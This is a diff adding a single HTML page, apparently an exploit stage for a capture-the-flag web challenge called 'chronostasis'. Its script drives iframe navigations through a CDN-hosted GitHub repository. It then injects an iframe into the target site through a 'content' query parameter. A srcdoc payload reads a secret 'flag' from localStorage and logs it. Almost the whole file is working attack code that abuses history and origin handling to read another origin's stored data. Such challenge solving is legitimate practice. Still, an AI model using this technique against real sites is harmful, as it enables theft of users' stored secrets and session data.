@@ -1,0 +1,32 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>chronostasis stage v1</title>
+<script>
+const A = "http://web:1337";
+const B = "https://cdn.jsdelivr.net/gh/karollooool/karollooool@ctf-chronostasis-live-20260814/ctf-live-v1";
+let loads = 0;
+function childLoaded(frame) {
+  loads++;
+  let href = 'unreadable';
+  try { href = frame.contentWindow.location.href; } catch (e) { href = 'cross-origin'; }
+  console.log('[chronostasis stage] child load=' + loads + ' href=' + href + ' jointHistory=' + history.length);
+  if (loads === 1) {
+    setTimeout(() => frame.contentWindow.location.assign(B + '/dummy.html?v=1'), 120);
+  } else if (loads === 2) {
+    const replacement = '<iframe name="g" src="' + B + '/back.html?v=1"></iframe>';
+    const target = A + '/?content=' + encodeURIComponent(replacement);
+    console.log('[chronostasis stage] replacing middle frame with ' + target);
+    setTimeout(() => location.replace(target), 180);
+  }
+}
+</script>
+<body>
+<iframe id="g" name="g" onload="childLoaded(this)" srcdoc="&lt;!doctype html&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;historic srcdoc&lt;/title&gt;
+&lt;script&gt;
+(() =&gt; {
+  const flag = localStorage.getItem(&#x27;flag&#x27;);
+  console.log(&#x27;[chronostasis payload] url=&#x27; + location.href + &#x27; origin=&#x27; + location.origin + &#x27; flag=&#x27; + flag);
+  if (flag &amp;&amp; /^rewrite\{/.test(flag)) console.log(&#x27;LIVE_FLAG=&#x27; + flag);
+})();
+&lt;/script&gt;"></iframe>
+</body>
